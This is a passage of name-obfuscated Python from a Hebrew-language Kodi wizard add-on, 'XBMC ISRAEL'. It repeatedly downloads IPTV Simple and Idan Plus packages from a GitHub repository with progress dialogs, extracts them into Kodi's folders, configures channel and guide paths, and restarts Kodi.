                    if not OOOOOOO00000O0OO0 :#line:5930
                        O000O0O0OOOO0O0OO =OO00O00OOOO0OO000 #line:5931
                    if O0OOO0OO0O0O0OOO0 .iscanceled ():#line:5932
                       O0OOO0OO0O0O0OOO0 .close ()#line:5933
                       try :#line:5934
                        os .remove (O00OOO0000OO000O0 )#line:5935
                       except :#line:5936
                        pass #line:5937
                       break #line:5938
                    OO0O00O00OO000OO0 =float (OO00O00OOOO0OO000 )/O000O0O0OOOO0O0OO #line:5939
                    OO0O00O00OO000OO0 =round (OO0O00O00OO000OO0 *100 ,2 )#line:5940
                    O0O000000O0OO0OO0 =OO00O00OOOO0OO000 /(1024 *1024 )#line:5941
                    OO0O0OOO0OO0O0OO0 =O000O0O0OOOO0O0OO /(1024 *1024 )#line:5942
                    O0O0OOO0O00O00O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O000000O0OO0OO0 ,'teal',OO0O0OOO0OO0O0OO0 )#line:5943
                    if (time .time ()-OO0000O0OOO00OO0O )>0 :#line:5944
                      OO0000000OOOOO00O =OO00O00OOOO0OO000 /(time .time ()-OO0000O0OOO00OO0O )#line:5945
                      OO0000000OOOOO00O =OO0000000OOOOO00O /1024 #line:5946
                    else :#line:5947
                     OO0000000OOOOO00O =0 #line:5948
                    O00O0O0O000OOOOOO ='KB'#line:5949
                    if OO0000000OOOOO00O >=1024 :#line:5950
                       OO0000000OOOOO00O =OO0000000OOOOO00O /1024 #line:5951
                       O00O0O0O000OOOOOO ='MB'#line:5952
                    if OO0000000OOOOO00O >0 and not OO0O00O00OO000OO0 ==100 :#line:5953
                        O0O00O00OOO0O0000 =(O000O0O0OOOO0O0OO -OO00O00OOOO0OO000 )/OO0000000OOOOO00O #line:5954
                    else :#line:5955
                        O0O00O00OOO0O0000 =0 #line:5956
                    O0OOOOOO0O000O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0000000OOOOO00O ,O00O0O0O000OOOOOO )#line:5957
                    O0OOO0OO0O0O0OOO0 .update (int (OO0O00O00OO000OO0 ),"Downloading "+'iptv',O0O0OOO0O00O00O0O ,O0OOOOOO0O000O0OO )#line:5959
              O0OO0OO0O0OO0OOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5962
              O00OO0O00OOOOOO0O .close ()#line:5965
              extract .all (O00OOO0000OO000O0 ,O0OO0OO0O0OO0OOOO ,O0OOO0OO0O0O0OOO0 )#line:5966
              try :#line:5969
                os .remove (O00OOO0000OO000O0 )#line:5970
              except :#line:5972
                pass #line:5973
              O0OOO0OO0O0O0OOO0 .close ()#line:5974
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5977
              O0OO00OOO000O00O0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5979
              OO0O0OO0OOO0000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5980
              OO00000OO0000O00O =xbmcgui .DialogProgress ()#line:5981
              OO00000OO0000O00O .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5982
              O00OOO0000OO000O0 =os .path .join (OO0O0OO0OOO0000OO ,'isr.zip')#line:5983
              OO0O00O0OO0O0O000 =urllib2 .Request (O0OO00OOO000O00O0 )#line:5984
              OOOOO00OO0O0O0000 =urllib2 .urlopen (OO0O00O0OO0O0O000 )#line:5985
              O0OOO0OO0O0O0OOO0 =xbmcgui .DialogProgress ()#line:5987
              O0OOO0OO0O0O0OOO0 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5988
              O0OOO0OO0O0O0OOO0 .update (0 )#line:5989
              O00OO0O00OOOOOO0O =open (O00OOO0000OO000O0 ,'wb')#line:5991
              try :#line:5993
                O000O0O0OOOO0O0OO =OOOOO00OO0O0O0000 .info ().getheader ('Content-Length').strip ()#line:5994
                OOOOOOO00000O0OO0 =True #line:5995
              except AttributeError :#line:5996
                    OOOOOOO00000O0OO0 =False #line:5997
              if OOOOOOO00000O0OO0 :#line:5999
                    O000O0O0OOOO0O0OO =int (O000O0O0OOOO0O0OO )#line:6000
              OO00O00OOOO0OO000 =0 #line:6002
              OO0000O0OOO00OO0O =time .time ()#line:6003
              while True :#line:6004
                    OO0O000O000OO00O0 =OOOOO00OO0O0O0000 .read (8192 )#line:6005
                    if not OO0O000O000OO00O0 :#line:6006
                        sys .stdout .write ('\n')#line:6007
                        break #line:6008
                    OO00O00OOOO0OO000 +=len (OO0O000O000OO00O0 )#line:6010
                    O00OO0O00OOOOOO0O .write (OO0O000O000OO00O0 )#line:6011
                    if not OOOOOOO00000O0OO0 :#line:6013
                        O000O0O0OOOO0O0OO =OO00O00OOOO0OO000 #line:6014
                    if O0OOO0OO0O0O0OOO0 .iscanceled ():#line:6015
                       O0OOO0OO0O0O0OOO0 .close ()#line:6016
                       try :#line:6017
                        os .remove (O00OOO0000OO000O0 )#line:6018
                       except :#line:6019
                        pass #line:6020
                       break #line:6021
                    OO0O00O00OO000OO0 =float (OO00O00OOOO0OO000 )/O000O0O0OOOO0O0OO #line:6022
                    OO0O00O00OO000OO0 =round (OO0O00O00OO000OO0 *100 ,2 )#line:6023
                    O0O000000O0OO0OO0 =OO00O00OOOO0OO000 /(1024 *1024 )#line:6024
                    OO0O0OOO0OO0O0OO0 =O000O0O0OOOO0O0OO /(1024 *1024 )#line:6025
                    O0O0OOO0O00O00O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O000000O0OO0OO0 ,'teal',OO0O0OOO0OO0O0OO0 )#line:6026
                    if (time .time ()-OO0000O0OOO00OO0O )>0 :#line:6027
                      OO0000000OOOOO00O =OO00O00OOOO0OO000 /(time .time ()-OO0000O0OOO00OO0O )#line:6028
                      OO0000000OOOOO00O =OO0000000OOOOO00O /1024 #line:6029
                    else :#line:6030
                     OO0000000OOOOO00O =0 #line:6031
                    O00O0O0O000OOOOOO ='KB'#line:6032
                    if OO0000000OOOOO00O >=1024 :#line:6033
                       OO0000000OOOOO00O =OO0000000OOOOO00O /1024 #line:6034
                       O00O0O0O000OOOOOO ='MB'#line:6035
                    if OO0000000OOOOO00O >0 and not OO0O00O00OO000OO0 ==100 :#line:6036
                        O0O00O00OOO0O0000 =(O000O0O0OOOO0O0OO -OO00O00OOOO0OO000 )/OO0000000OOOOO00O #line:6037
                    else :#line:6038
                        O0O00O00OOO0O0000 =0 #line:6039
                    O0OOOOOO0O000O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0000000OOOOO00O ,O00O0O0O000OOOOOO )#line:6040
                    O0OOO0OO0O0O0OOO0 .update (int (OO0O00O00OO000OO0 ),"Downloading "+'iptv',O0O0OOO0O00O00O0O ,O0OOOOOO0O000O0OO )#line:6042
              O0OO0OO0O0OO0OOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6045
              O00OO0O00OOOOOO0O .close ()#line:6048
              extract .all (O00OOO0000OO000O0 ,O0OO0OO0O0OO0OOOO ,O0OOO0OO0O0O0OOO0 )#line:6049
              try :#line:6050
                os .remove (O00OOO0000OO000O0 )#line:6051
              except :#line:6053
                pass #line:6054
              O0OOO0OO0O0O0OOO0 .close ()#line:6055
def iptvkodi17_18 ():#line:6056
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:6059
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6060
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6061
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:6065
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6066
              O00OOO0O00O0000O0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:6068
              OO00OOO00OOOO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6069
              O0OO00000OO000OOO =xbmcgui .DialogProgress ()#line:6070
              O0OO00000OO000OOO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6071
              OO0O0O00O0OOO0O0O =os .path .join (OO00OOO00OOOO0000 ,'isr.zip')#line:6072
              OOOO000OO000OOO0O =urllib2 .Request (O00OOO0O00O0000O0 )#line:6073
              O0OOOO000O0OO0OO0 =urllib2 .urlopen (OOOO000OO000OOO0O )#line:6074
              OOOOO00O00O0OO0OO =xbmcgui .DialogProgress ()#line:6076
              OOOOO00O00O0OO0OO .create ("Downloading","Downloading "+'iptv')#line:6077
              OOOOO00O00O0OO0OO .update (0 )#line:6078
              OOO0O00O0O000O000 =open (OO0O0O00O0OOO0O0O ,'wb')#line:6080
              try :#line:6082
                OOOOOO0O000O0000O =O0OOOO000O0OO0OO0 .info ().getheader ('Content-Length').strip ()#line:6083
                OOOO00000O0O00OO0 =True #line:6084
              except AttributeError :#line:6085
                    OOOO00000O0O00OO0 =False #line:6086
              if OOOO00000O0O00OO0 :#line:6088
                    OOOOOO0O000O0000O =int (OOOOOO0O000O0000O )#line:6089
              OOO00O0000OOO0OO0 =0 #line:6091
              OOOO0O0O0O00OO0O0 =time .time ()#line:6092
              while True :#line:6093
                    OOO0000O00O0O0000 =O0OOOO000O0OO0OO0 .read (8192 )#line:6094
                    if not OOO0000O00O0O0000 :#line:6095
                        sys .stdout .write ('\n')#line:6096
                        break #line:6097
                    OOO00O0000OOO0OO0 +=len (OOO0000O00O0O0000 )#line:6099
                    OOO0O00O0O000O000 .write (OOO0000O00O0O0000 )#line:6100
                    if not OOOO00000O0O00OO0 :#line:6102
                        OOOOOO0O000O0000O =OOO00O0000OOO0OO0 #line:6103
                    if OOOOO00O00O0OO0OO .iscanceled ():#line:6104
                       OOOOO00O00O0OO0OO .close ()#line:6105
                       try :#line:6106
                        os .remove (OO0O0O00O0OOO0O0O )#line:6107
                       except :#line:6108
                        pass #line:6109
                       break #line:6110
                    OO0O0OO0O00OO000O =float (OOO00O0000OOO0OO0 )/OOOOOO0O000O0000O #line:6111
                    OO0O0OO0O00OO000O =round (OO0O0OO0O00OO000O *100 ,2 )#line:6112
                    O00OOOOOO000O0000 =OOO00O0000OOO0OO0 /(1024 *1024 )#line:6113
                    O0OO000000O0000OO =OOOOOO0O000O0000O /(1024 *1024 )#line:6114
                    OOOO00O0OOOO000OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OOOOOO000O0000 ,'teal',O0OO000000O0000OO )#line:6115
                    if (time .time ()-OOOO0O0O0O00OO0O0 )>0 :#line:6116
                      O0O0O0000OOOOOO0O =OOO00O0000OOO0OO0 /(time .time ()-OOOO0O0O0O00OO0O0 )#line:6117
                      O0O0O0000OOOOOO0O =O0O0O0000OOOOOO0O /1024 #line:6118
                    else :#line:6119
                     O0O0O0000OOOOOO0O =0 #line:6120
                    OO00OO0OOOOOO0OOO ='KB'#line:6121
                    if O0O0O0000OOOOOO0O >=1024 :#line:6122
                       O0O0O0000OOOOOO0O =O0O0O0000OOOOOO0O /1024 #line:6123
                       OO00OO0OOOOOO0OOO ='MB'#line:6124
                    if O0O0O0000OOOOOO0O >0 and not OO0O0OO0O00OO000O ==100 :#line:6125
                        O00O00O0O0O0OOOOO =(OOOOOO0O000O0000O -OOO00O0000OOO0OO0 )/O0O0O0000OOOOOO0O #line:6126
                    else :#line:6127
                        O00O00O0O0O0OOOOO =0 #line:6128
                    O0OO00O00O0OOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0O0000OOOOOO0O ,OO00OO0OOOOOO0OOO )#line:6129
                    OOOOO00O00O0OO0OO .update (int (OO0O0OO0O00OO000O ),"Downloading "+'iptv',OOOO00O0OOOO000OO ,O0OO00O00O0OOO00O )#line:6131
              O0O000OO0O000OOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6134
              OOO0O00O0O000O000 .close ()#line:6137
              extract .all (OO0O0O00O0OOO0O0O ,O0O000OO0O000OOOO ,OOOOO00O00O0OO0OO )#line:6138
              wiz .kodi17Fix ()#line:6140
              try :#line:6142
                os .remove (OO0O0O00O0OOO0O0O )#line:6143
              except :#line:6145
                pass #line:6146
              OOOOO00O00O0OO0OO .close ()#line:6147
              xbmc .sleep (5000 )#line:6149
              O0O00OOOOOO00OOO0 ='התקנת לקוח טלוויזיה חיה'#line:6151
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00OOOOOO00OOO0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6152
              resetkodi ()#line:6153
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6154
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:6155
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6156
              O00OOO0O00O0000O0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:6157
              OO00OOO00OOOO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6158
              O0OO00000OO000OOO =xbmcgui .DialogProgress ()#line:6159
              O0OO00000OO000OOO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6160
              OO0O0O00O0OOO0O0O =os .path .join (OO00OOO00OOOO0000 ,'isr.zip')#line:6161
              OOOO000OO000OOO0O =urllib2 .Request (O00OOO0O00O0000O0 )#line:6162
              O0OOOO000O0OO0OO0 =urllib2 .urlopen (OOOO000OO000OOO0O )#line:6163
              OOOOO00O00O0OO0OO =xbmcgui .DialogProgress ()#line:6165
              OOOOO00O00O0OO0OO .create ("Downloading","Downloading "+'iptv')#line:6166
              OOOOO00O00O0OO0OO .update (0 )#line:6167
              OOO0O00O0O000O000 =open (OO0O0O00O0OOO0O0O ,'wb')#line:6169
              try :#line:6171
                OOOOOO0O000O0000O =O0OOOO000O0OO0OO0 .info ().getheader ('Content-Length').strip ()#line:6172
                OOOO00000O0O00OO0 =True #line:6173
              except AttributeError :#line:6174
                    OOOO00000O0O00OO0 =False #line:6175
              if OOOO00000O0O00OO0 :#line:6177
                    OOOOOO0O000O0000O =int (OOOOOO0O000O0000O )#line:6178
              OOO00O0000OOO0OO0 =0 #line:6180
              OOOO0O0O0O00OO0O0 =time .time ()#line:6181
              while True :#line:6182
                    OOO0000O00O0O0000 =O0OOOO000O0OO0OO0 .read (8192 )#line:6183
                    if not OOO0000O00O0O0000 :#line:6184
                        sys .stdout .write ('\n')#line:6185
                        break #line:6186
                    OOO00O0000OOO0OO0 +=len (OOO0000O00O0O0000 )#line:6188
                    OOO0O00O0O000O000 .write (OOO0000O00O0O0000 )#line:6189
                    if not OOOO00000O0O00OO0 :#line:6191
                        OOOOOO0O000O0000O =OOO00O0000OOO0OO0 #line:6192
                    if OOOOO00O00O0OO0OO .iscanceled ():#line:6193
                       OOOOO00O00O0OO0OO .close ()#line:6194
                       try :#line:6195
                        os .remove (OO0O0O00O0OOO0O0O )#line:6196
                       except :#line:6197
                        pass #line:6198
                       break #line:6199
                    OO0O0OO0O00OO000O =float (OOO00O0000OOO0OO0 )/OOOOOO0O000O0000O #line:6200
                    OO0O0OO0O00OO000O =round (OO0O0OO0O00OO000O *100 ,2 )#line:6201
                    O00OOOOOO000O0000 =OOO00O0000OOO0OO0 /(1024 *1024 )#line:6202
                    O0OO000000O0000OO =OOOOOO0O000O0000O /(1024 *1024 )#line:6203
                    OOOO00O0OOOO000OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OOOOOO000O0000 ,'teal',O0OO000000O0000OO )#line:6204
                    if (time .time ()-OOOO0O0O0O00OO0O0 )>0 :#line:6205
                      O0O0O0000OOOOOO0O =OOO00O0000OOO0OO0 /(time .time ()-OOOO0O0O0O00OO0O0 )#line:6206
                      O0O0O0000OOOOOO0O =O0O0O0000OOOOOO0O /1024 #line:6207
                    else :#line:6208
                     O0O0O0000OOOOOO0O =0 #line:6209
                    OO00OO0OOOOOO0OOO ='KB'#line:6210
                    if O0O0O0000OOOOOO0O >=1024 :#line:6211
                       O0O0O0000OOOOOO0O =O0O0O0000OOOOOO0O /1024 #line:6212
                       OO00OO0OOOOOO0OOO ='MB'#line:6213
                    if O0O0O0000OOOOOO0O >0 and not OO0O0OO0O00OO000O ==100 :#line:6214
                        O00O00O0O0O0OOOOO =(OOOOOO0O000O0000O -OOO00O0000OOO0OO0 )/O0O0O0000OOOOOO0O #line:6215
                    else :#line:6216
                        O00O00O0O0O0OOOOO =0 #line:6217
                    O0OO00O00O0OOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0O0000OOOOOO0O ,OO00OO0OOOOOO0OOO )#line:6218
                    OOOOO00O00O0OO0OO .update (int (OO0O0OO0O00OO000O ),"Downloading "+'iptv',OOOO00O0OOOO000OO ,O0OO00O00O0OOO00O )#line:6220
              O0O000OO0O000OOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6223
              OOO0O00O0O000O000 .close ()#line:6226
              extract .all (OO0O0O00O0OOO0O0O ,O0O000OO0O000OOOO ,OOOOO00O00O0OO0OO )#line:6227
              wiz .kodi17Fix ()#line:6228
              try :#line:6230
                os .remove (OO0O0O00O0OOO0O0O )#line:6231
              except :#line:6233
                pass #line:6234
              OOOOO00O00O0OO0OO .close ()#line:6235
              xbmc .sleep (5000 )#line:6237
              O0O00OOOOOO00OOO0 ='התקנת לקוח טלוויזיה חיה'#line:6239
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00OOOOOO00OOO0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6240
              resetkodi ()#line:6241
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6243
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:6244
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6245
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6246
def iptvidanplus ():#line:6247
    OO00O00OO0OOO0OOO =xbmcaddon .Addon ('plugin.video.idanplus')#line:6248
    OO00O00OO0OOO0OOO .setSetting ('useIPTV','true')#line:6249
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:6250
    if KODIV >=17 and KODIV <18 :#line:6253
        O00O00OO0O0OOOO0O ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:6255
        OOO00OO0O0000OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6256
        O000000O0O0O000O0 =xbmcgui .DialogProgress ()#line:6257
        O000000O0O0O000O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6258
        O000OOOOO00O0OO00 =os .path .join (PACKAGES ,'isr.zip')#line:6259
        O0O000O0OO0OOO000 =urllib2 .Request (O00O00OO0O0OOOO0O )#line:6260
        O00000OO000000O00 =urllib2 .urlopen (O0O000O0OO0OOO000 )#line:6261
        O0OOO0OOOOOO00000 =xbmcgui .DialogProgress ()#line:6263
        O0OOO0OOOOOO00000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6264
        O0OOO0OOOOOO00000 .update (0 )#line:6265
        OOOO00OOO0O000000 =open (O000OOOOO00O0OO00 ,'wb')#line:6267
        try :#line:6269
          OOO0OOO000O00O0O0 =O00000OO000000O00 .info ().getheader ('Content-Length').strip ()#line:6270
          OOO0OO000O00O000O =True #line:6271
        except AttributeError :#line:6272
              OOO0OO000O00O000O =False #line:6273
        if OOO0OO000O00O000O :#line:6275
              OOO0OOO000O00O0O0 =int (OOO0OOO000O00O0O0 )#line:6276
        O0O0OO000OO0O00O0 =0 #line:6278
        OO0OO000OO00O000O =time .time ()#line:6279
        while True :#line:6280
              OO0O0OOOO0O00O000 =O00000OO000000O00 .read (8192 )#line:6281
              if not OO0O0OOOO0O00O000 :#line:6282
                  sys .stdout .write ('\n')#line:6283
                  break #line:6284
              O0O0OO000OO0O00O0 +=len (OO0O0OOOO0O00O000 )#line:6286
              OOOO00OOO0O000000 .write (OO0O0OOOO0O00O000 )#line:6287
              if not OOO0OO000O00O000O :#line:6289
                  OOO0OOO000O00O0O0 =O0O0OO000OO0O00O0 #line:6290
              if O0OOO0OOOOOO00000 .iscanceled ():#line:6291
                 O0OOO0OOOOOO00000 .close ()#line:6292
                 try :#line:6293
                  os .remove (O000OOOOO00O0OO00 )#line:6294
                 except :#line:6295
                  pass #line:6296
                 break #line:6297
              O0OO0OO0O0O0O0000 =float (O0O0OO000OO0O00O0 )/OOO0OOO000O00O0O0 #line:6298
              O0OO0OO0O0O0O0000 =round (O0OO0OO0O0O0O0000 *100 ,2 )#line:6299
              OOOO000OOO0OO000O =O0O0OO000OO0O00O0 /(1024 *1024 )#line:6300
              OO0000OOO0OO00OOO =OOO0OOO000O00O0O0 /(1024 *1024 )#line:6301
              OO00OOO00O00O0OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO000OOO0OO000O ,'teal',OO0000OOO0OO00OOO )#line:6302
              if (time .time ()-OO0OO000OO00O000O )>0 :#line:6303
                OO000OO0OO00O0OOO =O0O0OO000OO0O00O0 /(time .time ()-OO0OO000OO00O000O )#line:6304
                OO000OO0OO00O0OOO =OO000OO0OO00O0OOO /1024 #line:6305
              else :#line:6306
               OO000OO0OO00O0OOO =0 #line:6307
              OO0OO0OOO00000OOO ='KB'#line:6308
              if OO000OO0OO00O0OOO >=1024 :#line:6309
                 OO000OO0OO00O0OOO =OO000OO0OO00O0OOO /1024 #line:6310
                 OO0OO0OOO00000OOO ='MB'#line:6311
              if OO000OO0OO00O0OOO >0 and not O0OO0OO0O0O0O0000 ==100 :#line:6312
                  O0O0O000OOO0000OO =(OOO0OOO000O00O0O0 -O0O0OO000OO0O00O0 )/OO000OO0OO00O0OOO #line:6313
              else :#line:6314
                  O0O0O000OOO0000OO =0 #line:6315
              OOO00OO0O00O0000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO000OO0OO00O0OOO ,OO0OO0OOO00000OOO )#line:6316
              O0OOO0OOOOOO00000 .update (int (O0OO0OO0O0O0O0000 ),OO00OOO00O00O0OOO ,OOO00OO0O00O0000O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6318
        O00O0O00O0OOO0OOO =xbmc .translatePath (os .path .join ('special://home/'))#line:6321
        OOOO00OOO0O000000 .close ()#line:6324
        extract .all (O000OOOOO00O0OO00 ,O00O0O00O0OOO0OOO ,O0OOO0OOOOOO00000 )#line:6325
        try :#line:6329
          os .remove (O000OOOOO00O0OO00 )#line:6330
        except :#line:6331
          pass #line:6332
        wiz .kodi17Fix ()#line:6333
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6334
        time .sleep (10 )#line:6335
        O0OOOOO000000O00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:6336
        O0OOOOO000000O00O .setSetting ('epgTimeShift','1.000000')#line:6337
        O0OOOOO000000O00O .setSetting ('m3uPathType','0')#line:6338
        O0OOOOO000000O00O .setSetting ('epgPathType','0')#line:6339
        O0OOOOO000000O00O .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6340
        O0OOOOO000000O00O .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:6341
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:6342
        resetkodi ()#line:6343
    if KODIV >=18 :#line:6346
        iptvkodi18idan ()#line:6348
        wiz .kodi17Fix ()#line:6349
        time .sleep (10 )#line:6351
        O0OOOOO000000O00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:6352
        O0OOOOO000000O00O .setSetting ('epgTimeShift','1.000000')#line:6353
        O0OOOOO000000O00O .setSetting ('m3uPathType','0')#line:6354
        O0OOOOO000000O00O .setSetting ('epgPathType','0')#line:6355
        O0OOOOO000000O00O .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6356
        O0OOOOO000000O00O .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:6357
        OOO0O00OOOOOOOOO0 ='הגדרת ערוצי עידן פלוס'#line:6358
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0O00OOOOOOOOO0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6359
        resetkodi ()#line:6360
def iptvsimpldown ():#line:6376
    OO00OO00OO0000O00 =(IPTV18 )#line:6378
    O0OO0OO0OOO0O00OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6379
    OO000O000OO0O0000 =xbmcgui .DialogProgress ()#line:6380
    OO000O000OO0O0000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6381
    O0O00000OOO0OOOO0 =os .path .join (PACKAGES ,'isr.zip')#line:6382
    O00OOO0OOOO000OO0 =urllib2 .Request (OO00OO00OO0000O00 )#line:6383
    OO000O000OO0O00O0 =urllib2 .urlopen (O00OOO0OOOO000OO0 )#line:6384
    OO00O0O0OO0OOOO0O =xbmcgui .DialogProgress ()#line:6386
    OO00O0O0OO0OOOO0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6387
    OO00O0O0OO0OOOO0O .update (0 )#line:6388
    OO0OO000OOOO00O00 =open (O0O00000OOO0OOOO0 ,'wb')#line:6390
    try :#line:6392
      OO00000O00O00000O =OO000O000OO0O00O0 .info ().getheader ('Content-Length').strip ()#line:6393
      OOOOOOOOO00O0O000 =True #line:6394
    except AttributeError :#line:6395
          OOOOOOOOO00O0O000 =False #line:6396
    if OOOOOOOOO00O0O000 :#line:6398
          OO00000O00O00000O =int (OO00000O00O00000O )#line:6399
    O000OO0OO000O0OOO =0 #line:6401
    O000O0OOOOO0OOOO0 =time .time ()#line:6402
    while True :#line:6403
          O0OOOOOO00OO00000 =OO000O000OO0O00O0 .read (8192 )#line:6404
          if not O0OOOOOO00OO00000 :#line:6405
              sys .stdout .write ('\n')#line:6406
              break #line:6407
          O000OO0OO000O0OOO +=len (O0OOOOOO00OO00000 )#line:6409
          OO0OO000OOOO00O00 .write (O0OOOOOO00OO00000 )#line:6410
          if not OOOOOOOOO00O0O000 :#line:6412
              OO00000O00O00000O =O000OO0OO000O0OOO #line:6413
          if OO00O0O0OO0OOOO0O .iscanceled ():#line:6414
             OO00O0O0OO0OOOO0O .close ()#line:6415
             try :#line:6416
              os .remove (O0O00000OOO0OOOO0 )#line:6417
             except :#line:6418
              pass #line:6419
             break #line:6420
          OOO0O00OO00O000O0 =float (O000OO0OO000O0OOO )/OO00000O00O00000O #line:6421
          OOO0O00OO00O000O0 =round (OOO0O00OO00O000O0 *100 ,2 )#line:6422
          OO00000O000O00000 =O000OO0OO000O0OOO /(1024 *1024 )#line:6423
          O0OOO000000O0000O =OO00000O00O00000O /(1024 *1024 )#line:6424
          OO00O0OO00OO0OOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00000O000O00000 ,'teal',O0OOO000000O0000O )#line:6425
          if (time .time ()-O000O0OOOOO0OOOO0 )>0 :#line:6426
            OOOO00O00O0000O0O =O000OO0OO000O0OOO /(time .time ()-O000O0OOOOO0OOOO0 )#line:6427
            OOOO00O00O0000O0O =OOOO00O00O0000O0O /1024 #line:6428
          else :#line:6429
           OOOO00O00O0000O0O =0 #line:6430
          OO0O00O0OO0000OOO ='KB'#line:6431
          if OOOO00O00O0000O0O >=1024 :#line:6432
             OOOO00O00O0000O0O =OOOO00O00O0000O0O /1024 #line:6433
             OO0O00O0OO0000OOO ='MB'#line:6434
          if OOOO00O00O0000O0O >0 and not OOO0O00OO00O000O0 ==100 :#line:6435
              OOO0O0O0000OOOO00 =(OO00000O00O00000O -O000OO0OO000O0OOO )/OOOO00O00O0000O0O #line:6436
          else :#line:6437
              OOO0O0O0000OOOO00 =0 #line:6438
          O00O00O000O0O000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO00O00O0000O0O ,OO0O00O0OO0000OOO )#line:6439
